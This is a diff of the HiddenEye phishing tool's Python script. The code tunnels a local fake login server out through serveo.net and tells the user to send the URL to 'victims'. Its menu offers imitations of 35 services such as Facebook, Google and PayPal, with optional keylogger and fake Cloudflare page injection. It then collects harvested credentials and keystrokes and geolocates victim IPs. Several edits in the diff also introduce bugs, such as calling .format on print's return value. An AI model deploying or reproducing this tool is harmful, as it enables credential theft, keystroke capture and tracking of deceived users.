@@ -231,30 +231,30 @@ def customServeo(port):
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
         {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ CUSTOM SERVEO URL ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2)
-        print("\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} SERVEO URL: {2}".format(MAIN0, MAIN2, MAIN3, port) + url + "{1}".format(MAIN0, MAIN4, MAIN3))
+        print("\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO VICTIMS-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} SERVEO URL: {2}".format(MAIN0, MAIN2, MAIN3, port) + url + "{}".format(MAIN0))
         print("\n")
 
     except CalledProcessError:
-        print (_('''\n\n{0}FAILED TO GET THIS DOMAIN. !!!\n\n{0}LOOKS LIKE CUSTOM URL IS NOT VALID or ALREADY OCCUPIED BY SOMEONE ELSE. !!!\n\n{0}[{1}!{0}]TRY TO SELECT ANOTHER CUSTOM DOMAIN{1} (GOING BACK).. !! \n
-''').format(MAIN0, MAIN4))
+        print ('''\n\n{0}FAILED TO GET THIS DOMAIN. !!!\n\n{0}LOOKS LIKE CUSTOM URL IS NOT VALID or ALREADY OCCUPIED BY SOMEONE ELSE. !!!\n\n{0}[{1}!{0}]TRY TO SELECT ANOTHER CUSTOM DOMAIN{1} (GOING BACK).. !! \n
+''').format(MAIN0, MAIN4)
         sleep(4)
         system('clear')
         return customServeo(port)
 
 def randomServeo(port):
     system('clear')
-    print(_('''
+    print('''
         {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ RANDOM SERVEO URL ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2))
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ RANDOM SERVEO URL ]{1}!! {0}\n-------------------------------''').format(MAIN0, MAIN2)
     system('ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:%s serveo.net > link.url 2> /dev/null &' % (port))
     sleep(8)
     try:
         output = check_output("grep -o '.\{0,0\}http.\{0,100\}' link.url",shell=True)
-        url = str(output).strip("b ' \ n r")
-        print("\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO VICTIMS-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} SERVEO URL: {2}".format(MAIN0, MAIN4, MAIN3, port) + url + "{1}".format(MAIN0, MAIN4, MAIN3))
+        url = str(output).strip("b ' \ n r") #FIXME
+        print("\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO VICTIMS-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} SERVEO URL: {2}".format(MAIN0, MAIN4, MAIN3, port) + url + "{}".format(MAIN0))
         print("\n")
     except CalledProcessError:
 
@@ -265,24 +265,24 @@ def randomServeo(port):
 def runMainMenu(): #menu where user select what they wanna use
 
     if 256 != system('which php > /dev/null'): #Checking if user have PHP
-        print (_(" {2}* {0}PHP INSTALLATION FOUND").format(MAIN2, MAIN4, MAIN0))
+        print (" {2}* {0}PHP INSTALLATION FOUND").format(MAIN2, MAIN4, MAIN0)
     else:
-        print (_("{0}**{2} PHP NOT FOUND: \n {0}~{1} Please install PHP and run me again.http://www.php.net/").format(MAIN2, MAIN4, MAIN0))
+        print ("{0}**{2} PHP NOT FOUND: \n {0}~{1} Please install PHP and run me again.http://www.php.net/").format(MAIN2, MAIN4, MAIN0)
 
     for i in range(101):
         sleep(0.02)
         stdout.write("\r")
-        stdout.write(_("{0}[{1}*{0}]{1} HiddenEye is Opening. Please Wait...{2}%").format(MAIN0, MAIN4, i))
+        stdout.write("{0}[{1}*{0}]{1} HiddenEye is Opening. Please Wait...{2}%").format(MAIN0, MAIN4, i)
         stdout.flush()
 
-    if input(_("\n{2}[{1}!{2}]{1} Do you agree to use this tool for educational purposes only? ({0}y{1}/{2}n{1})\n{2}HiddenEye >>> {0}").format(MAIN2, MAIN4, MAIN0)).upper() != 'Y': #Question where user must accept education purposes
+    if input("\n{2}[{1}!{2}]{1} Do you agree to use this tool for educational purposes only? ({0}y{1}/{2}n{1})\n{2}HiddenEye >>> {0}").format(MAIN2, MAIN4, MAIN0).upper() != 'Y': #Question where user must accept education purposes
         system('clear')
-        print (_('\n\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE.!{1} ]\n\n').format(MAIN0, MAIN4))
+        print ('\n\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE.!{1} ]\n\n').format(MAIN0, MAIN4)
         exit(0)
 
 def mainMenu():
     system('clear')
-    print (_('''
+    print ('''
 
  {2} ██   ██ ██ ██████   ██████   ███████ ███   ██  {3}███████ ██    ██ ███████ {1}
  {2} ██   ██ ██ ██    ██ ██    ██ ██      ████  ██  {3}██       ██  ██  ██      {1}
@@ -293,26 +293,26 @@ def mainMenu():
                                                      v{3}0{1}.{3}2{1}.{3}7{1} BY:DARKSEC{2}
              {3}[{2} Modern Phishing Tool With Advanced Functionality {3}]
 {3}[{2} PHISHING-KEYLOGGER-INFORMATION COLLECTOR-ALL_IN_ONE_TOOL-SOCIALENGINEERING {3}]
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~''').format(MAIN3, MAIN4, MAIN2, MAIN0))
-    print (_("------------------------\nSELECT ANY ATTACK VECTOR FOR YOUR VICTIM:\n------------------------").format(MAIN0, MAIN2))
-    print (_(" {0}[{1}1{0}]{1} Facebook        {0}[{1}10{0}]{1} Yahoo          {0}[{1}19{0}]{1} Pinterest      {0}[{1}28{0}]{1} DropBox ").format(MAIN0, MAIN2))
-    print (_(" {0}[{1}2{0}]{1} Google          {0}[{1}11{0}]{1} Twitch         {0}[{1}20{0}]{1} ProtonMail     {0}[{1}29{0}]{1} eBay").format(MAIN0, MAIN2))
-    print (_(" {0}[{1}3{0}]{1} LinkedIn        {0}[{1}12{0}]{1} Microsoft      {0}[{1}21{0}]{1} Spotify        {0}[{1}30{0}]{1} MySpace").format(MAIN0, MAIN2))
-    print (_(" {0}[{1}4{0}]{1} GitHub          {0}[{1}13{0}]{1} Steam          {0}[{1}22{0}]{1} Quora          {0}[{1}31{0}]{1} PayPal").format(MAIN0, MAIN2))
-    print (_(" {0}[{1}5{0}]{1} StackOverflow   {0}[{1}14{0}]{1} VK             {0}[{1}23{0}]{1} PornHub        {0}[{1}32{0}]{1} Shopify").format(MAIN0, MAIN2))
-    print (_(" {0}[{1}6{0}]{1} WordPress       {0}[{1}15{0}]{1} iCloud         {0}[{1}24{0}]{1} Adobe          {0}[{1}33{0}]{1} Verizon").format(MAIN0, MAIN2))
-    print (_(" {0}[{1}7{0}]{1} Twitter         {0}[{1}16{0}]{1} GitLab         {0}[{1}25{0}]{1} Badoo          {0}[{1}34{0}]{1} Yandex").format(MAIN0, MAIN2))
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~''').format(MAIN3, MAIN4, MAIN2, MAIN0)
+    print ("------------------------\nSELECT ANY ATTACK VECTOR FOR YOUR VICTIM:\n------------------------").format(MAIN0, MAIN2)
+    print (" {0}[{1}1{0}]{1} Facebook        {0}[{1}10{0}]{1} Yahoo          {0}[{1}19{0}]{1} Pinterest      {0}[{1}28{0}]{1} DropBox ").format(MAIN0, MAIN2)
+    print (" {0}[{1}2{0}]{1} Google          {0}[{1}11{0}]{1} Twitch         {0}[{1}20{0}]{1} ProtonMail     {0}[{1}29{0}]{1} eBay").format(MAIN0, MAIN2)
+    print (" {0}[{1}3{0}]{1} LinkedIn        {0}[{1}12{0}]{1} Microsoft      {0}[{1}21{0}]{1} Spotify        {0}[{1}30{0}]{1} MySpace").format(MAIN0, MAIN2)
+    print (" {0}[{1}4{0}]{1} GitHub          {0}[{1}13{0}]{1} Steam          {0}[{1}22{0}]{1} Quora          {0}[{1}31{0}]{1} PayPal").format(MAIN0, MAIN2)
+    print (" {0}[{1}5{0}]{1} StackOverflow   {0}[{1}14{0}]{1} VK             {0}[{1}23{0}]{1} PornHub        {0}[{1}32{0}]{1} Shopify").format(MAIN0, MAIN2)
+    print (" {0}[{1}6{0}]{1} WordPress       {0}[{1}15{0}]{1} iCloud         {0}[{1}24{0}]{1} Adobe          {0}[{1}33{0}]{1} Verizon").format(MAIN0, MAIN2)
+    print (" {0}[{1}7{0}]{1} Twitter         {0}[{1}16{0}]{1} GitLab         {0}[{1}25{0}]{1} Badoo          {0}[{1}34{0}]{1} Yandex").format(MAIN0, MAIN2)
 
-    print (_(" {0}[{1}8{0}]{1} Instagram       {0}[{1}17{0}]{1} Netflix        {0}[{1}26{0}]{1} CryptoCurrency {0}[{1}35{0}]{1} Reddit").format(MAIN0, MAIN2))
-    print (_(" {0}[{1}9{0}]{1} Snapchat        {0}[{1}18{0}]{1} Origin         {0}[{1}27{0}]{1} DevianArt      ").format(MAIN0, MAIN2))
-    option = input(_("{0}HiddenEye >>>  {1}").format(MAIN0, MAIN2))
+    print (" {0}[{1}8{0}]{1} Instagram       {0}[{1}17{0}]{1} Netflix        {0}[{1}26{0}]{1} CryptoCurrency {0}[{1}35{0}]{1} Reddit").format(MAIN0, MAIN2)
+    print (" {0}[{1}9{0}]{1} Snapchat        {0}[{1}18{0}]{1} Origin         {0}[{1}27{0}]{1} DevianArt      ").format(MAIN0, MAIN2)
+    option = input("{0}HiddenEye >>>  {1}").format(MAIN0, MAIN2)
     if option == '1':
         loadModule('Facebook')
-        customOption = input(_("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n{0}HiddenEye >>> {2}").format(MAIN0, MAIN2, MAIN2))
+        customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n{0}HiddenEye >>> {2}").format(MAIN0, MAIN2, MAIN2)
         runPhishing('Facebook', customOption)
     elif option == '2':
         loadModule('Google')
-        customOption = input(_("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n {0}[{1}3{0}]{1} New Google Web\n{0}HiddenEye >>> {2}").format(MAIN0, MAIN2, MAIN2))
+        customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n {0}[{1}3{0}]{1} New Google Web\n{0}HiddenEye >>> {2}").format(MAIN0, MAIN2, MAIN2)
         runPhishing('Google', customOption)
     elif option == '3':
         loadModule('LinkedIn')
@@ -336,7 +336,7 @@ def mainMenu():
         runPhishing('Twitter', customOption)
     elif option == '8':
         loadModule('Instagram')
-        customOption = input(_("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (To Lure The Users)\n {0}[{1}3{0}]{1} Instagram Advanced Scenario (Appears as Instagram Profile)\n {0}[{1}4{0}]{1} Instagram Verified Badge Attack (Lure To Get Blue Badge){1} *[NEW]*\n {0}[{1}5{0}]{1} Instafollower (Lure To Get More Followers){1} *[NEW]*\n{0}HiddenEye >>> {2}").format(MAIN0, MAIN2, MAIN2))
+        customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (To Lure The Users)\n {0}[{1}3{0}]{1} Instagram Advanced Scenario (Appears as Instagram Profile)\n {0}[{1}4{0}]{1} Instagram Verified Badge Attack (Lure To Get Blue Badge){1} *[NEW]*\n {0}[{1}5{0}]{1} Instafollower (Lure To Get More Followers){1} *[NEW]*\n{0}HiddenEye >>> {2}").format(MAIN0, MAIN2, MAIN2)
         runPhishing('Instagram', customOption)
     elif option == '9':
         loadModule('Snapchat')
@@ -360,7 +360,7 @@ def mainMenu():
         runPhishing('Steam', customOption)
     elif option == '14':
         loadModule('VK')
-        customOption = input(_("\nOperation mode:\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n{0}HiddenEye >>> {2}").format(MAIN0, MAIN4, MAIN2))
+        customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n{0}HiddenEye >>> {2}").format(MAIN0, MAIN4, MAIN2)
         runPhishing('VK', customOption)
     elif option == '15':
         loadModule('iCloud')
@@ -444,28 +444,28 @@ def mainMenu():
         runPhishing('Yandex', customOption)
     elif option == '35':
         loadModule('Reddit')
-        customOption = input(_("\nOperation mode:\n {0}[{1}1{0}]{1} New reddit page\n {0}[{1}2{0}]{1} Old reddit page\n{0}HiddenEye >>> {2}").format(MAIN0, MAIN2, MAIN2))
+        customOption = input("\nOperation mode:\n {0}[{1}1{0}]{1} New reddit page\n {0}[{1}2{0}]{1} Old reddit page\n{0}HiddenEye >>> {2}").format(MAIN0, MAIN2, MAIN2)
         runPhishing('Reddit', customOption)
 
     else:
         endMessage()
 
 def loadModule(module): #This one just show text..
-       print (_(''' {0}
- [{1}*{0}] SELECT ANY ONE MODE...{0}\n--------------------------------''').format(MAIN0, MAIN2))
+       print (''' {0}
+ [{1}*{0}] SELECT ANY ONE MODE...{0}\n--------------------------------''').format(MAIN0, MAIN2)
 
 def inputCustom(): #Question where user can input custom web-link
      system('clear')
-     print(_('''{1}
+     print('''{1}
         _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {0}http://github.com/darksecdevelopers
-        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ PUT YOUR REDIRECTING URL HERE ] {0}\n-------------------------------''').format(MAIN0, MAIN2))
-     print(_('''\n{1}**{0}(Choose Wisely As Your Victim Will Redirect to This Link)''').format(MAIN2, MAIN4))
-     print(_('''\n{1}**{0}(Do not leave it blank. Unless Errors may occur)''').format(MAIN2, MAIN4))
-     print(_('''\n{0}[{1}*{0}]{0}Insert a custom redirect url:''').format(MAIN0, MAIN4))
-     custom = input(_('''\n{0}REDIRECT HERE>>> {2}''').format(MAIN0, MAIN4, MAIN2))
+        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ PUT YOUR REDIRECTING URL HERE ] {0}\n-------------------------------''').format(MAIN0, MAIN2)
+     print('''\n{1}**{0}(Choose Wisely As Your Victim Will Redirect to This Link)''').format(MAIN2, MAIN4)
+     print('''\n{1}**{0}(Do not leave it blank. Unless Errors may occur)''').format(MAIN2, MAIN4)
+     print('''\n{0}[{1}*{0}]{0}Insert a custom redirect url:''').format(MAIN0, MAIN4)
+     custom = input('''\n{0}REDIRECT HERE>>> {2}''').format(MAIN0, MAIN4, MAIN2)
      if 'http://' in custom or 'https://' in custom :
          pass
      else:
@@ -494,17 +494,17 @@ def inputCustom(): #Question where user can input custom web-link
 
 def cloudfarePrompt():
 	system('clear')
-	print (_('''{1}
+	print ('''{1}
         _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {1}http://github.com/darksecdevelopers
         {0}** BY: {1}DARKSEC {0}**
-''').format(MAIN0, MAIN2))
-	print(_("-------------------------------\n{0}[ CLOUDFARE PROTECTION PROMPT ]{1}!! {0}\n-------------------------------").format(MAIN0, MAIN4))
+''').format(MAIN0, MAIN2)
+	print("-------------------------------\n{0}[ CLOUDFARE PROTECTION PROMPT ]{1}!! {0}\n-------------------------------").format(MAIN0, MAIN4)
 
 def addingCloudfare():
-        print(_("\n{0}[{1}*{0}]{0}DO YOU WANT TO ADD A CLOUDFARE PROTECTION FAKE PAGE -{1}(Y/N)").format(MAIN0, MAIN4))
+        print("\n{0}[{1}*{0}]{0}DO YOU WANT TO ADD A CLOUDFARE PROTECTION FAKE PAGE -{1}(Y/N)").format(MAIN0, MAIN4)
         choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(MAIN0, MAIN4,MAIN2))
         if choice == 'y' or choice == 'Y':
            addCloudfare()
@@ -513,27 +513,27 @@ def addingCloudfare():
 
 def addCloudfare():
          system('cp Server/www/index.html Server/www/home.php && cp WebPages/cloudfare.html Server/www/index.html')
-         print(_("\n{0}[{1}#{0}]CLOUDFARE FAKE PAGE{0} ADDED...").format(MAIN0, MAIN4))
+         print("\n{0}[{1}#{0}]CLOUDFARE FAKE PAGE{0} ADDED...").format(MAIN0, MAIN4)
          sleep(2)
 
 def keyloggerprompt():
 	system('clear')
-	print (_('''{1}
+	print ('''{1}
         _  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
         |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
         |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
         {1}http://github.com/darksecdevelopers
         {0}** BY: {1}DARKSEC {0}**
-''').format(MAIN0, MAIN2))
-	print(_("-------------------------------\n{0}[ KEYLOGGER PROMPT ]{1}!! {0}\n-------------------------------").format(MAIN0, MAIN4))
+''').format(MAIN0, MAIN2)
+	print("-------------------------------\n{0}[ KEYLOGGER PROMPT ]{1}!! {0}\n-------------------------------").format(MAIN0, MAIN4)
 
 def addingkeylogger():
-        print(_("\n{0}[{1}*{0}]{0}DO YOU WANT TO ADD A KEYLOGGER IN PHISHING PAGE-{1}(Y/N)").format(MAIN0, MAIN4))
-        choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(MAIN0, MAIN4,MAIN2))
-        if choice == 'y' or choice == 'Y':
-           addkeylogger()
-        else:
-            sleep(1)
+    print("\n{0}[{1}*{0}]{0}DO YOU WANT TO ADD A KEYLOGGER IN PHISHING PAGE-{1}(Y/N)").format(MAIN0, MAIN4)
+    choice = input("\n\n{1}{0}YOUR CHOICE >>> {2}".format(MAIN0, MAIN4,MAIN2))
+    if choice != ('y' or 'Y'):
+        sleep(1)
+    else:
+        addkeylogger()
 
 def addkeylogger():
      if path.exists('Server/www/index.html'):
@@ -543,7 +543,7 @@ def addkeylogger():
          f = open('Server/www/index.html', 'w')
          f.write(c)
          f.close()
-         print(_("\n{0}[{1}#{0}]Keylgger{0} ADDED !!!").format(MAIN0, MAIN4))
+         print("\n{0}[{1}#{0}]Keylgger{0} ADDED !!!").format(MAIN0, MAIN4)
          sleep(2)
      else:
          with open('Server/www/index.php') as f:
@@ -552,7 +552,7 @@ def addkeylogger():
          f = open('Server/www/index.php', 'w')
          f.write(c)
          f.close()
-         print(_("\n{0}[{1}#{0}]Keylgger{0} ADDED !!!").format(MAIN0, MAIN4))
+         print("\n{0}[{1}#{0}]Keylgger{0} ADDED !!!").format(MAIN0, MAIN4)
          sleep(2)
 
 def runServer(port):
@@ -567,7 +567,7 @@ def endMessage(): #Message when HiddenEye exit
            system('sudo python3 HiddenEye.py')
         elif choice == '':
             system('clear')
-            print (_('''
+            print ('''
                   {3}HIDDEN EYE {3}BY: DARKSEC TEAM
             {1}https://github.com/DarkSecDevelopers/HiddenEye
 
@@ -579,7 +579,7 @@ def endMessage(): #Message when HiddenEye exit
      [{3}!{0}] PLEASE DON'T HARM ANYONE , ITS ONLY FOR EDUCATIONAL PURPOSE.
      [{3}!{0}] WE WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS TOOL
 
-  {3}  [[*]] THANKS TO USE THIS TOOL. HAPPY HACKING ... GOOD BYE \n ''').format(MAIN2, MAIN2, MAIN4, MAIN0))
+  {3}  [[*]] THANKS TO USE THIS TOOL. HAPPY HACKING ... GOOD BYE \n ''').format(MAIN2, MAIN2, MAIN4, MAIN0)
         else:
             system('clear')
             return endMessage()
@@ -587,16 +587,16 @@ def endMessage(): #Message when HiddenEye exit
 def getCredentials(port):
 
 
-    print(_("{2}.........................................................................\n{0}[{1}!{0}]{1} IF FOUND {2}SEGMENTATION FAULT{1}, IT MEANS THE SERVER FAILED.            {2}| \n{0}[{1}!{0}]{1} THEN YOU HAVE TO RUN IT AGAIN.                                      {2}| \n{0}[{1}!{0}]{1} Use This Command In Another Terminal.                               {2}| \n{0}({2}cd Server/www/ && php -S 127.0.0.1:{3} > /dev/null{0})                   {2}| \n{2}.........................................................................   \n\n").format(MAIN2, MAIN2, MAIN0, port))
-    print(_("{0}[{1}*{0}]{1} Waiting For Victim Interaction. Keep Eyes On Requests Coming From Victim ... \n\n{2}++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n").format(MAIN0, MAIN2, MAIN4))
+    print("{2}.........................................................................\n{0}[{1}!{0}]{1} IF FOUND {2}SEGMENTATION FAULT{1}, IT MEANS THE SERVER FAILED.            {2}| \n{0}[{1}!{0}]{1} THEN YOU HAVE TO RUN IT AGAIN.                                      {2}| \n{0}[{1}!{0}]{1} Use This Command In Another Terminal.                               {2}| \n{0}({2}cd Server/www/ && php -S 127.0.0.1:{3} > /dev/null{0})                   {2}| \n{2}.........................................................................   \n\n").format(MAIN2, MAIN2, MAIN0, port)
+    print("{0}[{1}*{0}]{1} Waiting For Victim Interaction. Keep Eyes On Requests Coming From Victim ... \n\n{2}++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n").format(MAIN0, MAIN2, MAIN4)
     while True:
         with open('Server/www/usernames.txt') as creds:
             lines = creds.read().rstrip()
             if len(lines) != 0:
-                writeLog('{0}..................................................................'.format(MAIN3, MAIN4))
-                writeLog(_(' {0}[{1} CREDENTIALS FOUND {0}]{1}:\n {0}{2}{1}').format(MAIN2, MAIN3, lines))
+                writeLog('{}..................................................................'.format(MAIN3))
+                writeLog(' {0}[{1} CREDENTIALS FOUND {0}]{1}:\n {0}{2}{1}').format(MAIN2, MAIN3, lines)
                 system('rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
-                writeLog('{0}..................................................................'.format(MAIN3, MAIN4))
+                writeLog('{}..................................................................'.format(MAIN3))
 
         creds.close()
 
@@ -609,29 +609,29 @@ def getCredentials(port):
                 resp = urlopen('https://ipinfo.io/{0}/json'.format(ip))
                 ipinfo = json.loads(resp.read().decode(resp.info().get_param('charset') or 'utf-8'))
                 if 'bogon' in ipinfo:
-                    log('..................................................................'.format(MAIN0, MAIN4))
-                    log(_(' \n{0}[ VICTIM IP BONUS ]{1}:\n {0}{2}{1}').format(MAIN0, MAIN2, lines))
+                    writeLog('..................................................................')
+                    writeLog(' \n{0}[ VICTIM IP BONUS ]{1}:\n').format(MAIN0, MAIN2)
                 else:
                     matchObj = re.match('^(.*?),(.*)$', ipinfo['loc'])
                     latitude = matchObj.group(1)
                     longitude = matchObj.group(2)
-                    writeLog('..................................................................'.format(MAIN0, MAIN4))
-                    writeLog(_(' \n{0}[ VICTIM INFO FOUND ]{1}:\n{0}{2}{1}').format(MAIN3, MAIN2, lines))
-                    writeLog(_(' \n{0}Longitude: {2} \nLatitude: {3}{1}').format(MAIN3, MAIN2, longitude, latitude))
-                    writeLog(_(' \n{0}ISP: {2} \nCountry: {3}{1}').format(MAIN3, MAIN2, ipinfo['org'], ipinfo['country']))
-                    writeLog(_(' \n{0}Region: {2} \nCity: {3}{1}').format(MAIN3, MAIN2, ipinfo['region'], ipinfo['city']))
+                    writeLog('..................................................................')
+                    writeLog(' \n{0}[ VICTIM INFO FOUND ]{1}:\n').format(MAIN3, MAIN2)
+                    writeLog(' \n{0}Longitude: {1} \nLatitude: {2}').format(MAIN3, longitude, latitude)
+                    writeLog(' \n{0}ISP: {2} \nCountry: {3}{1}').format(MAIN3, MAIN2, ipinfo['org'], ipinfo['country'])
+                    writeLog(' \n{0}Region: {2} \nCity: {3}{1}').format(MAIN3, MAIN2, ipinfo['region'], ipinfo['city'])
                 system('rm -rf Server/www/ip.txt && touch Server/www/ip.txt')
-                writeLog('..................................................................'.format(MAIN0, MAIN4))
+                writeLog('..................................................................')
 
         creds.close()
 
         with open('Server/www/KeyloggerData.txt') as creds:
             lines = creds.read().rstrip()
             if len(lines) != 0:
-                writeLog('{0}...............................'.format(MAIN0, MAIN4))
-                writeLog(_(' {1}[{0} GETTING PRESSED KEYS {1}]{1}:\n {0}%s{1}').format(MAIN3, MAIN2) % lines)
+                writeLog('{}...............................'.format(MAIN0))
+                writeLog(' {1}[{0} GETTING PRESSED KEYS {1}]{1}:\n {0}{2}'.format(MAIN3, MAIN2, lines))
                 system('rm -rf Server/www/KeyloggerData.txt && touch Server/www/KeyloggerData.txt')
-                writeLog('{0}...............................'.format(MAIN0, MAIN4))
+                writeLog('{}...............................'.format(MAIN0))
 
 
         creds.close()
